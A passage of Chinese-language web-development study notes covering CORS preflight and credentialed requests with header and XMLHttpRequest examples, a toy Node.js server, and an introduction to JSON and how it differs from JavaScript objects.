bold;">浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 方法和头信息字段</span>。</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest 请求，否则就报错。</span></span></div><div><br/></div><div><span style="font-size: 12pt;">之后浏览器每次就会直接请求而不用再询问服务器否可以跨域了。</span></div><div><br/></div><div><span style="font-size: 12pt;">注意先许可再请求等于默认禁止了跨源请求。</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，</span></span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">防止服务器收到大量 DELETE 和 PUT 请求，这些传统的表单不可能跨域发出的请求。</span></span></div><div><br/></div><div><span style="font-size: 12pt;">“预</span><span style="font-size: 12pt;">检</span><span style="font-size: 12pt;">请求”</span><span style="font-size: 12pt;">的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。</span></div><div><br/></div><div><span style="font-size: 12pt;">“预</span><span style="font-size: 12pt;">检</span><span style="font-size: 12pt;">请求”要求必须先发送一个 OPTIONS 请求给目的站点，来查明这个跨站请求对于目的站点是不是安全可接受的。</span></div><div><br/></div><div><span style="font-size: 12pt;">这样做，是因为跨站请求可能会对目的站点的数据造成破坏。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">遇到</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">“预</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">检</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">请求”</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，服务器总是返回一个 200 的响应，没有响应体，但是会包含 Access-Control-Allow-Origin ，以及一些其他响应头</span></div><div><br/></div><div><span style="font-size: 12pt;">（</span><span style="font-size: 12pt;">如果浏览器请求包括Access-Control-Request-Headers 字段，则</span><span style="font-size: 12pt;">响应必须</span><span style="font-size: 12pt;">要包含相同的响应头：</span><span style="font-size: 12pt;">Access-Control-Allow-Headers 字段</span><span style="font-size: 12pt;">）：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">HTTP/1.1 200 OK</span></div><div><span style="font-size: 12pt;">Access-Control-Allow-Origin: <a href="https://domain-a.com/">https://domain-a.com</a></span></div><div><span style="font-size: 12pt;">Access-Control-Allow-Methods: GET, POST, OPTIONS, DELETE</span></div><div><span style="font-size: 12pt;">Access-Control-Max-Age: 3600</span></div></div><div><br/></div><div><span style="font-size: 12pt;">服务器</span><span style="font-size: 12pt;">告诉浏览器，它只能响应来自</span> <a href="http://domain-a.com/" style="font-size: 12pt;">domain-a.com</a> <span style="font-size: 12pt;">的请求，可以处理 GET, POST, OPTIONS 或者 DELETE 请求（PUT 请求会被阻止），并且它可以缓存此信息 3600 秒</span></div><div><br/></div><div><span style="font-size: 12pt;">在这之后，浏览器不需要发起一个新的 OPTIONS 请求。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">假设你前端的域名为</span> <a href="http://domain-a.com/" style="font-size: 12pt; font-weight: bold;">domain-a.com</a> <span style="font-size: 12pt; font-weight: bold;">，后端API的域名为</span> <a href="http://domain-b.com/" style="font-size: 12pt; font-weight: bold;">domain-b.com</a><span style="font-size: 12pt; font-weight: bold;">，对话会是这样的：</span></div><div><br/></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;">  </span><span style="font-size: 12pt;"> 浏览器：“Hey</span> <a href="http://domain-b.com/" style="font-size: 12pt;">domain-b.com</a><span style="font-size: 12pt;">，</span><a href="http://domain-a.com/" style="font-size: 12pt;">domain-a.com</a><span style="font-size: 12pt;"> 上的这个脚本要向你发起一次Ajax请求，但是我应该阻止它，除非你告诉我这个请求是没问题的。”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;">  </span><span style="font-size: 12pt;"> 服务器：“我不知道，但是我可以告诉你，</span><a href="https://domain-a.com/" style="font-size: 12pt;">https://domain-a.com</a> <span style="font-size: 12pt;">只允许发送 GET，POST，OPTIONS 和 DELETE 请求，并且需要每10分钟验证一次。”</span></div><div><br/></div><div><span style="font-size: 12pt;">浏览器想了想：“ yeah，这是个正确的域名，我应该让他发送请求。”</span></div><div><br/></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;">  </span><span style="font-size: 12pt;"> 浏览器：“Hey</span> <a href="http://domain-b.com/" style="font-size: 12pt;">domain-b.com</a><span style="font-size: 12pt;">，我想在这个终端向你发送 POST 请求。”</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;">  </span><span style="font-size: 12pt;"> 服务器：“没问题，这是你的 200 ”</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [4].png" type="image/png" data-filename="3.png" width="784"/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">处理允许多个域</span></div><div><br/></div><div><span style="font-size: 12pt;">您可以使用 Access-Control-Allow-Origin: * 来允许每个域访问，也可以只允许一个域访问。</span></div><div><br/></div><div><span style="font-size: 12pt;">这意味着如果您需要多个域来访问您的 API 时，您需要自己处理它。</span></div><div><br/></div><div><span style="font-size: 12pt;">处理此问题的最简单方法是在服务器上维护允许访问的域列表，如果域位于该列表中，则动态的改变响应头的内容。</span></div><div><br/></div><div><span style="font-size: 12pt;">Node.js 的例子</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">app.use(function(req, res, next) {</span></div><div><span style="font-size: 12pt;">  const allowedOrigins = [</span></div><div><span style="font-size: 12pt;">    &quot;<a href="http://www.mydomain.com/">http://www.mydomain.com</a>&quot;,</span></div><div><span style="font-size: 12pt;">    &quot;<a href="https://www.mydomain.com/">https://www.mydomain.com</a>&quot;,</span></div><div><span style="font-size: 12pt;">    &quot;<a href="http://www.myotherdomain.com/">http://www.myotherdomain.com</a>&quot;,</span></div><div><span style="font-size: 12pt;">    &quot;<a href="http://www.myotherdomain.com/">http://www.myotherdomain.com</a>&quot;,</span></div><div><span style="font-size: 12pt;">  ];</span></div><div><span style="font-size: 12pt;">  const origin = req.headers.origin;</span></div><div><span style="font-size: 12pt;">  if(allowedOrigins.indexOf(origin) &gt; -1){</span></div><div><span style="font-size: 12pt;">    res.setHeader('Access-Control-Allow-Origin', origin);</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">  return next();</span></div><div><span style="font-size: 12pt;">});</span></div></div><div><span style="font-size: 12pt; font-weight: bold;"> </span></div><div><span style="font-size: 12pt; font-weight: bold;">当请求具备以下条件之一，就会被当成预</span><span style="font-size: 12pt; font-weight: bold;">检</span><span style="font-size: 12pt; font-weight: bold;">请求处理：</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">1、</span><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">请求以 GET, HEAD 或者 POST 以外的方法发起请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">     或者，使用 POST，但请求数据为 application/x-www-form-urlencoded, multipart/form-data 或者 text/plain 以外的数据类型。</span></div><div><br/></div><div><span style="font-size: 12pt;">     比如说，用 POST 发送数据类型为 application/xml 或者 text/xml 的 XML 数据的请求。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">2、使用自定义请求头（比如添加诸如 X-PINGOTHER）</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [66].jpg" type="image/jpeg" data-filename="3.jpg" width="1080"/></div><div><br/></div><div><span style="font-size: 12pt;">举个例子：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var invocation = new XMLHttpRequest();</span></div><div><span style="font-size: 12pt;">var url = '<a href="http://bar.other/resources/post-here/';">http://bar.other/resources/post-here/';</a></span></div><div><span style="font-size: 12pt;">var body = '{C}{C}{C}{C}{C}{C}{C}{C}{C}{C}Arun';</span></div><div><span style="font-size: 12pt;">function callOtherDomain(){</span></div><div><span style="font-size: 12pt;">  if(invocation){</span></div><div><span style="font-size: 12pt;">    invocation.open('POST', url, true);</span></div><div><span style="font-size: 12pt;">    invocation.setRequestHeader('X-PINGOTHER', 'pingpong');</span></div><div><span style="font-size: 12pt;">    invocation.setRequestHeader('Content-Type', 'application/xml');</span></div><div><span style="font-size: 12pt;">    invocation.onreadystatechange = handler;</span></div><div><span style="font-size: 12pt;">    invocation.send(body);</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><br/></div><div><span style="font-size: 12pt;">上面代码</span><span style="font-size: 12pt;">以 XMLHttpRequest 创建了一个 POST 请求，为该请求添加了一个自定义请求头(X-PINGOTHER: pingpong)，并指定数据类型为 application/xml 。</span></div><div><br/></div><div><span style="font-size: 12pt;">所以，该请求是一个“预请求”形式的跨站请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">浏览器将使用一个 OPTIONS 发送了一个“预请求”。</span></div><div><br/></div><div><span style="font-size: 12pt;">Firefox 3.1 根据请求参数，决定需要发送一个“预请求”，来探明服务器端是否接受后续真正的请求。 </span></div><div><br/></div><div><span style="font-size: 12pt;">OPTIONS 是 HTTP/1.1 里的方法，用来获取更多服务器端的信息，是一个不应该对服务器数据造成影响的方法。 </span></div><div><br/></div><div><span style="font-size: 12pt;">随同 OPTIONS 请求，以下两个请求头一起被发送：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">Access-Control-Request-Method: POST</span></div><div><span style="font-size: 12pt;">Access-Control-Request-Headers: X-PINGOTHER</span></div></div><div><br/></div><div><span style="font-size: 12pt;">假设服务器成功响应返回部分信息如下：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">Access-Control-Allow-Origin: <a href="http://foo.example/">http://foo.example</a> //表明服务器允许<a href="http://foo.example/">http://foo.example</a>的请求</span></div><div><br/></div><div><span style="font-size: 12pt;">Access-Control-Allow-Methods: POST, GET, OPTIONS //表明服务器可以接受POST, GET和 OPTIONS的请求方法</span></div><div><br/></div><div><span style="font-size: 12pt;">Access-Control-Allow-Headers: X-PINGOTHER // 传递一个可接受的自定义请求头列表。服务器也需要设置一个与浏览器对应。</span></div><div><span style="font-size: 12pt;">// 否则会报 Request header field X-Requested-With is not allowed by Access-Control-Allow-Headers in preflight response 的错误</span></div><div><br/></div><div><span style="font-size: 12pt;">Access-Control-Max-Age: 1728000 //告诉浏览器，本次“预请求”的响应结果有效时间是多久。在上面的例子里，1728000秒代表着20天内，浏览器在处理针对该服务器的跨站请求，都可以无需再发送“预请求”，只需根据本次结果进行判断处理。</span></div></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [5].png" type="image/png" data-filename="3.png" width="521"/></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">附带凭证信息的请求</span></div><div><br/></div><div><span style="font-size: 12pt;">Fetch 与 CORS 的一个有趣的特性是，可以基于 HTTP cookies 和 HTTP 认证信息发送身份凭证。</span></div><div><br/></div><div><span style="font-size: 12pt;">一般而言，对于跨域 XMLHttpRequest 或 Fetch 请求，浏览器不会发送身份凭证信息。</span></div><div><br/></div><div><span style="font-size: 12pt;">CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等），这是为了降低 CSRF 攻击的风险。</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">但是某些场合，服务器可能需要拿到 Cookie，这时需要服务器显式指定 Access-Control-Allow-Credentials 字段，告诉浏览器可以发送 Cookie。</span></span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">同时，开发者必须在 AJAX 请求中打开 withCredentials 属性。</span></span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">需要注意的是，如果服务器要求浏览器发送 Cookie，Access-Control-Allow-Origin 就不能设为星号，必须指定明确的、与请求网页一致的域名。</span></span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，</span></span></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold; color: rgb(118, 0, 216); font-family: unset;">且（跨域）原网页代码中的 document.cookie 也无法读取服务器域名下的 Cookie。</span></b></div><div><br/></div><div><span style="font-size: 12pt;">下面例子中，</span><a href="http://foo.example/" style="font-size: 12pt;">http://foo.example</a> <span style="font-size: 12pt;">的某脚本向</span> <a href="http://bar.other/" style="font-size: 12pt;">http://bar.other</a> <span style="font-size: 12pt;">发起一个GET 请求，并设置 Cookies：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var invocation = new XMLHttpRequest();</span></div><div><span style="font-size: 12pt;">var url = '<a href="http://bar.other/resources/credentialed-content/';">http://bar.other/resources/credentialed-content/';</a></span></div><div><span style="font-size: 12pt;">    </span></div><div><span style="font-size: 12pt;">function callOtherDomain(){</span></div><div><span style="font-size: 12pt;">  if(invocation) {</span></div><div><span style="font-size: 12pt;">    invocation.open('GET', url, true);</span></div><div><span style="font-size: 12pt;">    invocation.withCredentials = true;</span></div><div><span style="font-size: 12pt;">    invocation.onreadystatechange = handler;</span></div><div><span style="font-size: 12pt;">    invocation.send();</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><br/></div><div><span style="font-size: 12pt;">第 7 行将 XMLHttpRequest 的 withCredentials 属性设置为 true，从而向服务器发送 Cookies。</span></div><div><br/></div><div><span style="font-size: 12pt;">因为这是一个简单 GET 请求，所以浏览器不会对其发起“预检请求”。</span></div><div><br/></div><div><span style="font-size: 12pt;">但是，如果服务器端的响应中未携带 Access-Control-Allow-Credentials: true ，将不会把响应内容返回给请求的发送者。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [6].png" type="image/png" data-filename="3.png" width="521"/></div><div><br/></div><div><span style="font-size: 12pt;">假设服务器成功响应返回部分信息如下：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">Access-Control-Allow-Origin: <a href="http://foo.example/">http://foo.example</a></span></div><div><span style="font-size: 12pt;">Access-Control-Allow-Credentials: true</span></div><div><span style="font-size: 12pt;">Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT</span></div></div><div><br/></div><div><span style="font-size: 12pt;">如果 bar.other 的响应头里没有 Access-Control-Allow-Credentials：true，则响应会被忽略。</span></div><div><br/></div><div><span style="font-size: 12pt;">特别注意: 给一个带有 withCredentials 的请求发送响应的时候，服务器端必须指定允许请求的域名,不能使用“*”。</span></div><div><br/></div><div><span style="font-size: 12pt;">上面这个例子中，如果响应头是这样的 Access-Control-Allow-Origin：* ，则响应会失败。</span></div><div><br/></div><div><span style="font-size: 12pt;">在这个例子里,因为 Access-Control-Allow-Origin 的值是</span> <a href="http://foo.example/" style="font-size: 12pt;">http://foo.example</a> <span style="font-size: 12pt;">这个指定的请求域名，所以客户端把带有凭证信息的内容被返回给了客户端。</span></div><div><br/></div><div><span style="font-size: 12pt;">另外注意，更多的 cookie 信息也被创建了。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">扩展：</span></div><div><br/></div><div><a href="https://wangdoc.com/javascript/bom/cors.html#%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B" style="font-size: 12pt;">https://wangdoc.com/javascript/bom/cors.html#%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B</a></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">CORS 和 JSONP 对比</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">●</span><span style="font-size: 12pt; color: unset; font-family: unset;"> </span><span style="font-size: 12pt;"> JSONP 只能实现 GET 请求，而 CORS 支持所有类型的 HTTP 请求。</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">●</span><span style="font-size: 12pt; color: unset; font-family: unset;"> </span><span style="font-size: 12pt;"> 使用 CORS，开发者可以使用普通的 XMLHttpRequest 发起请求和获得数据，比起 JSONP 有更好的错误处理。</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">●</span><span style="font-size: 12pt; color: unset; font-family: unset;"> </span><span style="font-size: 12pt;">JSONP 主要被老的浏览器支持，它们往往不支持 CORS，而绝大多数现代浏览器都已经支持了 CORS。</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">●</span><span style="font-size: 12pt; color: unset; font-family: unset;"> </span><span style="font-size: 12pt;">CORS 与 JSONP 相比，无疑更为先进、方便和可靠。</span></div><div><br/></div><div><br/></div></div><hr/><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">一个简单的 Node.js 服务器</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var http = require('http')</span></div><div><span style="font-size: 12pt;">var fs = require('fs')</span></div><div><span style="font-size: 12pt;">var url = require('url')</span></div><div><span style="font-size: 12pt;">var port = process.argv[2]</span></div><div><span style="font-size: 12pt;">if (!port) {</span></div><div><span style="font-size: 12pt;">  console.log('请指定端口号好不啦？\nnode server.js 8888 这样不会吗？')</span></div><div><span style="font-size: 12pt;">  process.exit(1)</span></div><div><span style="font-size: 12pt;">}</span></div><div><span style="font-size: 12pt;">var server = http.createServer(function(request, response){</span></div><div><span style="font-size: 12pt;">  var parsedUrl = url.parse(request.url, true)</span></div><div><span style="font-size: 12pt;">  var path = request.url</span></div><div><span style="font-size: 12pt;">  var query = ''</span></div><div><span style="font-size: 12pt;">  if (path.indexOf('?') &gt;= 0) { query = path.substring(path.indexOf('?')) }</span></div><div><span style="font-size: 12pt;">  var pathNoQuery = parsedUrl.pathname</span></div><div><span style="font-size: 12pt;">  var queryObject = parsedUrl.query</span></div><div><span style="font-size: 12pt;">  var method = request.method</span></div><div><span style="font-size: 12pt;">  /******** 从这里开始看，上面不要看 ************/</span></div><div><span style="font-size: 12pt;">  console.log('HTTP 路径为\n' + path)</span></div><div><span style="font-size: 12pt;">  if(path == '/style.js') {</span></div><div><span style="font-size: 12pt;">    response.setHeader('Content-Type', 'text/css; charset=utf-8')</span></div><div><span style="font-size: 12pt;">    response.write('body{background-color: #ddd;}h1{color: red;}')</span></div><div><span style="font-size: 12pt;">    response.end()</span></div><div><span style="font-size: 12pt;">  }else if (path == '/script.html') {</span></div><div><span style="font-size: 12pt;">    response.setHeader('Content-Type', 'text/javascript; charset=utf-8')</span></div><div><span style="font-size: 12pt;">    response.write('alert(&quot;这是JS执行的&quot;)')</span></div><div><span style="font-size: 12pt;">    response.end()</span></div><div><span style="font-size: 12pt;">  } else if (path == '/index.css') {</span></div><div><span style="font-size: 12pt;">    response.setHeader('Content-Type', 'text/html; charset=utf-8')</span></div><div><span style="font-size: 12pt;">response.write('&lt;!DOCTYPE&gt;\n&lt;html&gt;'  +</span></div><div><span style="font-size: 12pt;">      '&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/style.js&quot;&gt;' +</span></div><div><span style="font-size: 12pt;">      '&lt;/head&gt;&lt;body&gt;'  +</span></div><div><span style="font-size: 12pt;">      '&lt;h1&gt;你好&lt;/h1&gt;' +</span></div><div><span style="font-size: 12pt;">      '&lt;script src=&quot;/script.html&quot;&gt;&lt;/script&gt;' +</span></div><div><span style="font-size: 12pt;">      '&lt;/body&gt;&lt;/html&gt;')</span></div><div><span style="font-size: 12pt;">    response.end()</span></div><div><span style="font-size: 12pt;">  }else{</span></div><div><span style="font-size: 12pt;">    response.statusCode = 404</span></div><div><span style="font-size: 12pt;">    response.end()</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">  /******** 代码结束，下面不要看 ************/</span></div><div><span style="font-size: 12pt;">})</span></div><div><span style="font-size: 12pt;">server.listen(port)</span></div><div><span style="font-size: 12pt;">console.log('监听 ' + port + ' 成功\n请用在空中转体720度然后用电饭煲打开</span> <a href="http://localhost/" style="font-size: 12pt;">http://localhost</a><span style="font-size: 12pt;">:' + port)</span></div></div><div><br/></div><div><br/></div><hr/><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JSON</span></font></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [67].jpg" type="image/jpeg" data-filename="3.jpg" width="679"/></div><div><br/></div><div><span style="font-size: 12pt;">以前用XML这样传数据：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">&lt;note&gt;</span></div><div><span style="font-size: 12pt;">    &lt;to&gt;小谷&lt;/to&gt;</span></div><div><span style="font-size: 12pt;">    &lt;from&gt;方方&lt;/from&gt;</span></div><div><span style="font-size: 12pt;">    &lt;heading&gt;打招呼&lt;/heading&gt;</span></div><div><span style="font-size: 12pt;">    &lt;body&gt;你好&lt;/body&gt;</span></div><div><span style="font-size: 12pt;">&lt;/note&gt;</span></div></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">现在用 JSON 这样传数据：</span></span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">{</span></div><div><span style="font-size: 12pt;">    &quot;note&quot;: {</span></div><div><span style="font-size: 12pt;">        &quot;to&quot;:  &quot;小谷&quot;,</span></div><div><span style="font-size: 12pt;">        &quot;from&quot;: &quot;方方&quot;,</span></div><div><span style="font-size: 12pt;">        &quot;heading&quot;: &quot;打招呼&quot;,</span></div><div><span style="font-size: 12pt;">        &quot;content&quot;: &quot;hi&quot;</span></div><div><span style="font-size: 12pt;">     }</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [68].jpg" type="image/jpeg" data-filename="3.jpg" width="679"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JSON是一种新语言，但不是编程语言</span></font></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON 是</span></font><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">由道格拉斯·克罗克福特构想和设计的</span></font><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">一种轻量级的数据交换格式 / 语言</span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">它抄袭了JavaScript的语法，但没有抄 undefined 和 function 以及新出的 Symbol、BigInt</span></font></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON 数据格式与语言无关，脱胎自JavaScript，但当前很多编程语言都支持 JSON 格式数据的生成和解析</span></span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON</span> <span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">是 JS对象 的一个子集</span></div><div><br/></div><div><font color="#7600D8" style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">JS的对象中，符合JSON数据格式规范的认为该JS对象是JSON对象</span></font></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">JSON 与 </span><span style="font-size: 12pt; font-weight: bold;">JS对象的区别</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">1. JSON 没有变量，没有对象实例，没有原型链，</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">没有抄 undefined 和 function，JSON 值不能是 function / undefined / NaN</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">2. </span></span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON 的 字符串 和 对象属性 首尾必须用双引号，不能用单引号，</span> <span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">键必须加双引号</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">3. JSON 末尾没有分号</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">4. JSON 的官方 MIME 类型是 application/json</span></span></span></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JSON 数据值</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">● 数字（整数或浮点数）</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 字符串（在双引号中）</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 逻辑值（true 或 false）</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 数组（在方括号中）</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 对象（在花括号中）</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> null</span></div><div><br/></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JS 对象</span></font></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">var obj1 = {}; // 这只是 JS 对象</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">var obj2 = {width:100, height:200}; /* 这跟 JSON 就更不沾边了,只是 JS 的对象 */</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">var obj3 = {'width':100, 'height':200}; /* 这跟 JSON 